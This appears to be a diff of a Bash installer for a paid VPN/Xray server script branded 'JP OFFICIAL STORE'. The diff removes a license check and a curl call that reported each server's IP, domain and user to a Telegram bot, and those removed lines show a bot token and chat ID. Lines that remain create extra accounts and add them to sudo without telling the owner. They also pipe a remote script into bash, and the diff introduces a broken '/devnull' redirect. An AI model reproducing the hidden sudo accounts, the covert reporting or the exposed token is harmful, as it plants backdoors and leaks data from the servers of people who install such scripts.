@@ -1,3 +1,4 @@
+
 #!/bin/bash
 apt upgrade -y
 apt update -y
@@ -26,29 +27,6 @@ KIRI="\033[1;32m>\033[1;33m>\033[1;31m>\033[1;31m$NC"
 ipsaya=$(wget -qO- ipinfo.io/ip)
 data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 date_list=$(date +"%Y-%m-%d" -d "$data_server")
-data_ip="https://github.com/VPNULTIMATE/JP_V1"
-checking_sc() {
-  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
-  if [[ $date_list < $useexp ]]; then
-    echo -ne
-  else
-    echo -e "\033[1;93mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\033[0m"
-    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
-    echo -e "\033[1;93mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\033[0m"
-    echo -e ""
-    echo -e "            ${RED}PERMISSION DENIED !${NC}"
-    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
-    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
-    echo -e "             \033[0;33mContact Admin :${NC}"
-    echo -e "      \033[0;36mTelegram${NC} t.me/@JPOFFICIALSTORE"
-    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6281943340077"
-    echo -e "\033[1;93mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\033[0m"
-    exit
-  fi
-}
-checking_sc
-
-
 # // Getting
 userdel jame > /dev/null 2>&1
 Username="g"
@@ -64,44 +42,44 @@ export IP=$( curl -sS icanhazip.com )
 clear
 clear && clear && clear
 clear;clear;clear
-echo -e "${BlueBee}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
+echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
 echo -e "\033[96;1m                       JP OFFICIAL STORE               \033[0m"
-echo -e "${BlueBee}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
+echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
 echo ""
 echo ""
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${OK}   Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 echo -e ""
 else
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 exit 1
 fi
 if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 else
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 exit 1
 fi
 if [[ $ipsaya == "" ]]; then
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${EROR} IP Address ( ${RED}Not Detected${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 else
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "${OK}   IP Address ( ${green}$IP${NC} )"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 fi
 echo ""
 echo ""
@@ -120,12 +98,8 @@ red='\e[1;31m'
 green='\e[0;32m'
 NC='\e[0m'
 MYIP=$(curl -sS ipv4.icanhazip.com)
-url_izin="https://github.com/VPNULTIMATE/JP_V1"
+
 rm -f /usr/bin/user
-username=$(curl $url_izin | grep $MYIP | awk '{print $2}')
-echo "$username" >/usr/bin/user
-expx=$(curl $url_izin | grep $MYIP | awk '{print $3}')
-echo "$expx" >/usr/bin/e
 username=$(cat /usr/bin/user)
 oid=$(cat /usr/bin/ver)
 exp=$(cat /usr/bin/e)
@@ -143,12 +117,6 @@ mai="datediff "$Exp" "$DATE""
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl $url_izin | grep $MYIP | awk '{print $4}')
-if [[ $today < $Exp1 ]]; then
-sts="${Info}"
-else
-sts="${Error}"
-fi
 echo -e "\e[32mloading...\e[0m"
 clear
 REPO="https://github.com/VPNULTIMATE/JP_V1"
@@ -160,9 +128,9 @@ function print_ok() {
 echo -e "${OK} ${BLUE} $1 ${FONT}"
 }
 function print_install() {
-echo -e "${BlueBee}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
+echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
 echo -e "${CYAN}    [ MULAI MENGINSTAL ]  $1 ${FONT}"
-echo -e "${BlueBee}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
+echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
 sleep 1
 }
 function print_error() {
@@ -170,9 +138,9 @@ echo -e "${ERROR} ${REDBG} $1 ${FONT}"
 }
 function print_success() {
 if [[ 0 -eq $? ]]; then
-echo -e "${BlueBee}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
+echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
 echo -e "${Green}  [ INSTALL SUCCESS ] ${FONT}"
-echo -e "${BlueBee}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
+echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
 sleep 2
 fi
 }
@@ -247,10 +215,6 @@ echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PR
 fi
 }
 
-TIMES="10"
-CHATID="6847302328"
-KEY="7052161849:AAGq0ZlI8pGg_7ytHBMz36JASucDr_9w-sM"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
 # // install paket
 function base_package() {
 clear
@@ -284,14 +248,14 @@ clear
 function pasang_domain() {
 echo -e ""
 clear
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— \e[0m"
+echo -e "\e[94;1m╔════════════════════════════════════════════════╗ \e[0m"
 echo -e "                       \e[92;1m DOMAIN MENU \e[0m  "
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \e[0m"
+echo -e "\e[94;1m╚════════════════════════════════════════════════╝ \e[0m"
 echo -e ""
 echo -e "          \e[1;32m1)\e[0m DOMAIN SENDIRI [ REKOMEND ]"
 echo -e ""
 echo -e ""
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ \e[0m"
 echo
 echo
 read -p "   Select Nomor 1 : " host
@@ -300,15 +264,15 @@ if [[ $host == "1" ]]; then
 clear
 echo ""
 echo ""
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—$NC"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
 echo -e "\e[1;32m                    INPUT YOUR DOMAIN $NC"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 echo -e ""
 echo -e "\e[91;1m WARNING !! \e[0m"
 echo -e "\e[92;1m  # \e[97;1mPastikan Domain anda udah di pointing \e[0m"
 echo -e "\e[92;1m  # \e[97;1mPastikan ipvps ter pointing ke domain \e[0m"
 echo -e ""
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 echo ""
 echo ""
 read -p "   INPUT YOUR DOMAIN :   " host1
@@ -327,8 +291,6 @@ fi
 }
 clear
 restart_system() {
-USRSC=$(wget -qO- $url_izin | grep $ipsaya | awk '{print $2}')
-EXPSC=$(wget -qO- $url_izin | grep $ipsaya | awk '{print $3}')
 domain=$(cat /root/domain)
 userdel jame > /dev/null 2>&1
 Username="RZ"
@@ -340,20 +302,17 @@ usermod -aG sudo $Username > /dev/null 2>&1
 
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TEXT="
-<code>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</code>
-<b> âš ï¸ AUTO SCRIPT PREMIUM âš ï¸</b>
-<code>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</code>
-<code>ID     : </code><code>$USRSC</code>
-<code>Domain : </code><code>$domain</code>
-<code>Date   : </code><code>$TIME</code>
-<code>Time   : </code><code>$TIMEZONE</code>
-<code>Ip vps : </code><code>$ipsaya</code>
-<code>Exp Sc : </code><code>$EXPSC</code>
-<code>user   : </code><code>$Username</code>
-<code>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</code>
-<i>Notif Install Autoscript</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"á´Ê€á´…á´‡Ê€","url":"https://t.me/JPOFFICIALSTORE"},{"text":"Contack","url":"wa.me/+6287873951705"}]]}'
-curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+────────────────────
+ ⚠️ AUTO SCRIPT PREMIUM ⚠️
+────────────────────
+Domain : $domain
+Date   : $TIME
+Time   : $TIMEZONE
+Ip vps : $ipsaya
+user   : $Username
+────────────────────
+Notif Install Autoscript
+"
 }
 clear
 function pasang_ssl() {
@@ -425,7 +384,7 @@ chown www-data.www-data $domainSock_dir
 latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
 bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
 wget -O /etc/xray/config.json "${REPO}files/config.json" >/dev/null 2>&1
-wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/dev/null 2>&1
+wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/devnull 2>&1
 domain=$(cat /etc/xray/domain)
 IPVS=$(cat /etc/xray/ipvps)
 print_success "Core Xray 1.8.1 Latest Version"
@@ -902,31 +861,31 @@ sudo hostnamectl set-hostname $username
 clear
 echo -e ""
 echo -e ""
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\e[0m"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
 echo -e "\e[96;1m                 ----[ JP OFFICIAL PROJECT ]----                \e[0m"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
 echo ""
 echo -e "\e[95;1m  Telegram : @JPOFFICIALSTORE \e[0m"
 echo ""
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\e[0m"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
 echo -e "\e[92;1m                  ----[ INSTALL SUCCES ]----                 \e[0m"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
 echo -e ""
-echo -e " \e[93;1mâ€¢\e[0m SSH  = UDP / OPENVPN / ENHANCED / MULTI PORT "
-echo -e " \e[93;1mâ€¢\e[0m VMESS = MULTIPATCH / MULTIPORT / GRPC / TLS / WS "
-echo -e " \e[93;1mâ€¢\e[0m VLESS = MULTIPATCH / MULTIPORT / GRPC / TPS / WS "
-echo -e " \e[93;1mâ€¢\e[0m TROJAN = MULTIPATCH / MULTIPORT / GRPC / TLS / WS+SSL "
-echo -e " \e[93;1mâ€¢\e[0m SSR = MULTIPATCH / MULTIPORT / GRPC / TLS "
+echo -e " \e[93;1m•\e[0m SSH  = UDP / OPENVPN / ENHANCED / MULTI PORT "
+echo -e " \e[93;1m•\e[0m VMESS = MULTIPATCH / MULTIPORT / GRPC / TLS / WS "
+echo -e " \e[93;1m•\e[0m VLESS = MULTIPATCH / MULTIPORT / GRPC / TPS / WS "
+echo -e " \e[93;1m•\e[0m TROJAN = MULTIPATCH / MULTIPORT / GRPC / TLS / WS+SSL "
+echo -e " \e[93;1m•\e[0m SSR = MULTIPATCH / MULTIPORT / GRPC / TLS "
 echo -e ""
-echo -e "\e[94;1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\e[0m"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
 echo -e "\e[92;1m                    ----[ INFO PORT ]----                      \e[0m"
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
 echo -e ""
-echo -e " \e[93;1mâ€¢\e[0m WEBSOCKET / WS / NTLS   :  80,8880,8080,2082,2095,2082 "
-echo -e " \e[93;1mâ€¢\e[0m SSL  / TLS / GRPC /     :  443,8443 "
-echo -e " \e[93;1mâ€¢\e[0m UDP CUSTOM              :  1-65535 "
+echo -e " \e[93;1m•\e[0m WEBSOCKET / WS / NTLS   :  80,8880,8080,2082,2095,2082 "
+echo -e " \e[93;1m•\e[0m SSL  / TLS / GRPC /     :  443,8443 "
+echo -e " \e[93;1m•\e[0m UDP CUSTOM              :  1-65535 "
 echo -e ""
-echo -e "\e[94;1mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
 echo -e ""
 echo ""
 read -p "[ Enter ]  TO REBOOT"
